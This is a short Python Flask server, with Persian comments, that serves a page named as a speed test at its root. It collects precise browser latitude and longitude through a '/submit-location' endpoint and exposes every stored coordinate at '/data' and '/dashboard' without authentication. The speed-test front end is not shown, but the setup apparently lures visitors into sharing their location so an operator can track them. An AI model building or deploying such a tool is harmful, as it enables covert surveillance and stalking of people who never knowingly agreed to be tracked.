from flask import Flask, request, jsonify, send_from_directory
import os

app = Flask(__name__, static_folder='.')

# ذخیره مکان‌های دقیق از مرورگر
locations = []

@app.route('/submit-location', methods=['POST'])
def submit_location():
    data = request.json
    lat = data.get('lat')
    lng = data.get('lng')
    if lat is not None and lng is not None:
        locations.append({'lat': lat, 'lng': lng})
        print(f"📍 مکان دقیق دریافت شد: {lat}, {lng}")
    return jsonify({"status": "success"})

@app.route('/data')
def get_data():
    return jsonify(locations)

@app.route('/dashboard')
def dashboard():
    return send_from_directory('.', 'dashboard.html')

@app.route('/')
def speed_test():
    return send_from_directory('.', 'speedtest.html')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
